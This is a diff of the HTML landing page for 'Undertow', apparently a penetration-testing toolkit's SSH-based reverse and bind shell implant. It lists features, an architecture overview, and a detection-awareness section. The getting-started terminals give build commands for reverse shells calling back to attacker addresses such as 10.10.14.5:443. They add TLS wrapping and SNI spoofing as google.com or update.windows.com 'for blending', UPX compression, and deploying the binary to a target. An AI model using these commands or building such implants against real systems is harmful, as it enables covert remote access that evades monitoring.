+                <div class="pill animate"><span class="dot dot-g"></span>Reverse Shell</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Bind Shell</div>
+                <div class="pill animate"><span class="dot dot-g"></span>SFTP</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Local Forward</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Remote Forward</div>
+                <div class="pill animate"><span class="dot dot-g"></span>SOCKS Proxy</div>
+                <div class="pill animate"><span class="dot dot-g"></span>TLS Wrapping</div>
+                <div class="pill animate"><span class="dot dot-g"></span>SNI Spoofing</div>
+                <div class="pill animate"><span class="dot dot-g"></span>ALPN Negotiation</div>
+                <div class="pill animate"><span class="dot dot-g"></span>PTY (Linux)</div>
+                <div class="pill animate"><span class="dot dot-g"></span>ConPTY (Windows)</div>
+                <div class="pill animate"><span class="dot dot-g"></span>UPX Compress</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Handler Gen</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Auto Credentials</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Static Binary</div>
+                <div class="pill animate"><span class="dot dot-g"></span>Zero Dependencies</div>
+            </div>
+            <div style="margin-top:16px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ov0)">
+                <span style="color:var(--green)">&#9679;</span> Full
             </div>
         </div>
     </section>
 
-    <!-- ══ Architecture ══ -->
-    <section class="section">
+    <!-- Architecture -->
+    <section id="architecture">
         <div class="container">
-            <div class="section-label">Architecture</div>
-            <h2 class="section-title">~800 Lines of Go</h2>
-            <p class="section-desc">Clean, focused codebase across 6 source files. Static compilation, build tags for platform support, timing-safe authentication.</p>
-
+            <div class="section-label animate">ARCHITECTURE</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Four-layer design</h2>
+            <p class="section-desc animate" style="transition-delay:.16s">Clean separation between build, SSH server, session handling, and TLS. Under 800 lines of Go across 6 source files.</p>
             <div class="arch-grid">
-                <div class="arch-card">
-                    <h4 style="color: var(--sapphire)">main.go</h4>
-                    <p>Entry point, SSH server setup, compile-time variables via ldflags</p>
+                <div class="arch-card animate" style="transition-delay:.1s"><div class="arch-num">1</div><h3>Build System</h3><p><code>build.sh</code> generates the static binary and handler script. Compile-time variables via <code>ldflags</code>. Catppuccin-themed output. Optional UPX compression via <code>--compress</code>.</p></div>
+                <div class="arch-card animate" style="transition-delay:.2s"><div class="arch-num">2</div><h3>SSH Server</h3><p>ED25519 key generation, password and public-key authentication, session multiplexing. Timing-safe credential comparison. Reverse dial or bind listen based on mode.</p></div>
+                <div class="arch-card animate" style="transition-delay:.3s"><div class="arch-num">3</div><h3>Session Layer</h3><p>PTY allocation on Linux via <code>creack/pty</code>, ConPTY on Windows 10+. SFTP subsystem via <code>sftp.NewRequestServer</code>. Command execution fallback for non-PTY sessions.</p></div>
+                <div class="arch-card animate" style="transition-delay:.4s"><div class="arch-num">4</div><h3>TLS Layer</h3><p>Optional TLS wrapping around SSH transport. Auto-generated self-signed certificates. ALPN negotiation (<code>h2</code>, <code>http/1.1</code>). SNI spoofing to any hostname.</p></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Getting Started -->
+    <section style="background:var(--mantle)">
+        <div class="container">
+            <div class="section-label animate">GETTING STARTED</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Build and deploy</h2>
+            <p class="section-desc animate" style="transition-delay:.16s">Clone, build, deploy. The handler script manages credentials and connections for you.</p>
+            <div class="two-col">
+                <div class="terminal animate" style="transition-delay:.1s">
+                    <div class="terminal-bar"><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-label">build</span></div>
+                    <div class="terminal-body"><pre><span class="t-g">$</span> git clone https://github.com/Real-Fruit-Snacks/Undertow.git
+<span class="t-g">$</span> cd Undertow
+
+<span class="t-m"># Reverse shell</span>
+<span class="t-g">$</span> ./build.sh reverse 10.10.14.5:4444
+
+<span class="t-m"># Bind shell</span>
+<span class="t-g">$</span> ./build.sh listen 8888
+
+<span class="t-m"># With UPX compression</span>
+<span class="t-g">$</span> ./build.sh reverse 10.10.14.5:4444 --compress</pre></div>
                 </div>
-                <div class="arch-card">
-                    <h4 style="color: var(--lavender)">core.go</h4>
-                    <p>Auth handlers, port forwarding, SFTP, TLS cert generation, reverse dial</p>
-                </div>
-                <div class="arch-card">
-                    <h4 style="color: var(--blue)">ssh_session.go</h4>
-                    <p>Session dispatcher for PTY, command execution, and forwarding-only requests</p>
-                </div>
-                <div class="arch-card">
-                    <h4 style="color: var(--teal)">ssh_session_unix.go</h4>
-                    <p>Unix PTY allocation via creack/pty with build tag gating</p>
-                </div>
-                <div class="arch-card">
-                    <h4 style="color: var(--mauve)">ssh_session_windows.go</h4>
-                    <p>Windows ConPTY with ssh-shellhost fallback for older builds</p>
-                </div>
-                <div class="arch-card">
-                    <h4 style="color: var(--green)">build.sh</h4>
-                    <p>Build wrapper with Catppuccin output, handler generation, UPX support</p>
+                <div class="terminal animate" style="transition-delay:.25s">
+                    <div class="terminal-bar"><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-label">usage</span></div>
+                    <div class="terminal-body"><pre><span class="t-m"># TLS-wrapped reverse shell on 443</span>
+<span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443 --tls
+
+<span class="t-m"># TLS with SNI spoofing</span>
+<span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443 --tls --sni google.com
+
+<span class="t-m"># Start handler, deploy binary, SSH in</span>
+<span class="t-g">$</span> ./bin/handler-10-10-14-5-443
+<span class="t-p">Connection from 10.10.10.5:48372</span>
+<span class="t-b">ssh -p 2222 svc@127.0.0.1</span></pre></div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- ══ Getting Started ══ -->
-    <section class="section">
+    <!-- Detection -->
+    <section>
         <div class="container">
-            <div class="section-label">Getting Started</div>
-            <h2 class="section-title">Deploy in Seconds</h2>
-            <p class="section-desc">Build a reverse or bind shell with a single command. The handler script manages credentials and connections for you.</p>
-
-            <div class="terminal">
-                <div class="terminal-header">
-                    <span class="terminal-dot" style="background: #f38ba8"></span>
-                    <span class="terminal-dot" style="background: #f9e2af"></span>
-                    <span class="terminal-dot" style="background: #a6e3a1"></span>
-                    <span class="terminal-title">reverse-shell.sh</span>
+            <div class="section-label animate">DETECTION AWARENESS</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Know the boundaries</h2>
+            <div class="two-col" style="margin-top:32px">
+                <div class="detect-card detect-hidden animate" style="transition-delay:.1s">
+                    <h3>Hidden From</h3>
+                    <ul>
+                        <li>Deep packet inspection -- when TLS enabled</li>
+                        <li>Casual process inspection -- generic binary name</li>
+                    </ul>
                 </div>
-                <div class="terminal-body">
-                    <span class="comment"># Build a reverse shell that connects back to your machine</span><br>
-                    <span class="prompt">$</span> <span class="cmd">./build.sh</span> <span class="flag">reverse</span> <span class="string">192.168.1.10:4444</span><br><br>
-                    <span class="comment"># Start the handler (shows SSH command on callback)</span><br>
-                    <span class="prompt">$</span> <span class="cmd">./bin/handler-192-168-1-10-4444</span><br><br>
-                    <span class="comment"># Deploy the binary to the target and run it</span><br>
-                    <span class="prompt">target$</span> <span class="cmd">./undertow-192-168-1-10-4444-linux-x64</span>
-                </div>
-            </div>
-
-            <div class="terminal">
-                <div class="terminal-header">
-                    <span class="terminal-dot" style="background: #f38ba8"></span>
-                    <span class="terminal-dot" style="background: #f9e2af"></span>
-                    <span class="terminal-dot" style="background: #a6e3a1"></span>
-                    <span class="terminal-title">tls-wrapped.sh</span>
-                </div>
-                <div class="terminal-body">
-                    <span class="comment"># TLS-wrapped reverse shell on port 443 (looks like HTTPS)</span><br>
-                    <span class="prompt">$</span> <span class="cmd">./build.sh</span> <span class="flag">reverse</span> <span class="string">10.10.14.5:443</span> <span class="flag">--tls</span><br><br>
-                    <span class="comment"># Custom SNI hostname for blending</span><br>
-                    <span class="prompt">$</span> <span class="cmd">./build.sh</span> <span class="flag">reverse</span> <span class="string">10.10.14.5:443</span> <span class="flag">--tls</span> <span class="flag">--sni</span> <span class="string">update.windows.com</span>
-                </div>
-            </div>
-
-            <div class="terminal">
-                <div class="terminal-header">
-                    <span class="terminal-dot" style="background: #f38ba8"></span>
-                    <span class="terminal-dot" style="background: #f9e2af"></span>
-                    <span class="terminal-dot" style="background: #a6e3a1"></span>
-                    <span class="terminal-title">bind-shell.sh</span>
-                </div>
-                <div class="terminal-body">
-                    <span class="comment"># Build a bind shell that listens on target</span><br>
-                    <span class="prompt">$</span> <span class="cmd">./build.sh</span> <span class="flag">listen</span> <span class="string">8888</span><br><br>
-                    <span class="comment"># Connect from attacker machine</span><br>
-                    <span class="prompt">$</span> <span class="cmd">ssh</span> <span class="flag">-p 8888</span> <span class="string">svc@TARGET_IP</span>
+                <div class="detect-card detect-visible animate" style="transition-delay:.2s">
+                    <h3>Visible To</h3>
+                    <ul>
+                        <li><code>netstat</code> / <code>ss</code> -- network connections</li>
+                        <li>EDR / XDR -- behavioral analysis</li>
+                        <li>Memory forensics -- RAM inspection</li>
+                        <li><code>strace</code> / <code>eBPF</code> -- syscall tracing</li>
+                    </ul>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- ══ Footer ══ -->
-    <footer class="footer">
+    <!-- Footer -->
+    <footer>
         <div class="container">
-            <div class="footer-links">
-                <a href="https://github.com/Real-Fruit-Snacks/Undertow">GitHub</a>
-                <a href="https://github.com/Real-Fruit-Snacks/Undertow/issues">Issues</a>
-                <a href="https://github.com/Real-Fruit-Snacks/Undertow/blob/main/LICENSE">GPLv3 License</a>
-                <a href="https://github.com/Real-Fruit-Snacks/Undertow/blob/main/CONTRIBUTING.md">Contributing</a>
-                <a href="https://github.com/Real-Fruit-Snacks/Undertow/blob/main/SECURITY.md">Security</a>
+            <div class="footer-line"></div>
+            <div class="footer-grid">
+                <div><h4>Documentation</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Undertow#quick-start">Quick Start</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Undertow#features">Features</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Undertow#architecture">Architecture</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Undertow#security">Security</a></li></ul></div>
+                <div><h4>Resources</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Undertow/releases/latest">Latest Release</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Undertow/issues">Report Issue</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Undertow/blob/main/CONTRIBUTING.md">Contributing</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Undertow/blob/main/CHANGELOG.md">Changelog</a></li></ul></div>
+                <div><h4>Toolkit</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Flux">Flux</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Slipstream">Slipstream</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Conduit">Conduit</a></li><li><a href="https://github.com/Real-Fruit-Snacks">View All →</a></li></ul></div>
+                <div><h4>License</h4><p>GPLv3 License<br>Copyright © 2026<br>Real-Fruit-Snacks</p></div>
             </div>
-            <p class="footer-toolkit">
-                <a href="https://github.com/Real-Fruit-Snacks/Aquifer">Aquifer</a> &middot;
-                <a href="https://github.com/Real-Fruit-Snacks/Cascade">Cascade</a> &middot;
-                <a href="https://github.com/Real-Fruit-Snacks/Conduit">Conduit</a> &middot;
-                <a href="https://github.com/Real-Fruit-Snacks/Flux">Flux</a> &middot;
-                <a href="https://github.com/Real-Fruit-Snacks/HydroShot">HydroShot</a> &middot;
-                <a href="https://github.com/Real-Fruit-Snacks/Riptide">Riptide</a> &middot;
-                <a href="https://github.com/Real-Fruit-Snacks/Runoff">Runoff</a> &middot;
-                <a href="https://github.com/Real-Fruit-Snacks/Seep">Seep</a> &middot;
-                <a href="https://github.com/Real-Fruit-Snacks/Slipstream">Slipstream</a> &middot;
-                <a href="https://github.com/Real-Fruit-Snacks/Tidepool">Tidepool</a> &middot;
-                <strong>Undertow</strong> &middot;
-                <a href="https://github.com/Real-Fruit-Snacks/Whirlpool">Whirlpool</a>
-            </p>
-            <p class="footer-brand">
-                Part of the <a href="https://github.com/Real-Fruit-Snacks">Real-Fruit-Snacks</a> water-themed security toolkit
-            </p>
+            <div class="footer-bottom">Part of the Real-Fruit-Snacks security toolkit</div>
         </div>
     </footer>
 
+    <script>
+    // Scroll animations
+    const obs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting){el.target.classList.add('visible');obs.unobserve(el.target)}})},{threshold:.1,rootMargin:'0px 0px -50px 0px'});
+    document.querySelectorAll('.animate,.animate-scale').forEach(el=>obs.observe(el));
+
+    // Counter animation
+    function countUp(el){const t=parseInt(el.dataset.target),s=el.dataset.suffix||'',p=el.dataset.prefix||'',d=1500,st=performance.now();if(t===0){el.textContent=p+s;return}function u(n){const pr=Math.min((n-st)/d,1),e=1-Math.pow(1-pr,3);el.textContent=p+Math.floor(t*e)+s;if(pr<1)requestAnimationFrame(u)}requestAnimationFrame(u)}
+    const sobs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting){countUp(el.target);sobs.unobserve(el.target)}})},{threshold:.5});
+    document.querySelectorAll('.stat-num').forEach(el=>sobs.observe(el));
+
+    // Nav scroll
+    window.addEventListener('scroll',()=>{document.querySelector('.nav').style.borderBottomColor=window.scrollY>20?'rgba(49,50,68,0.8)':'rgba(49,50,68,0.3)'});
+    </script>
 </body>
 </html>
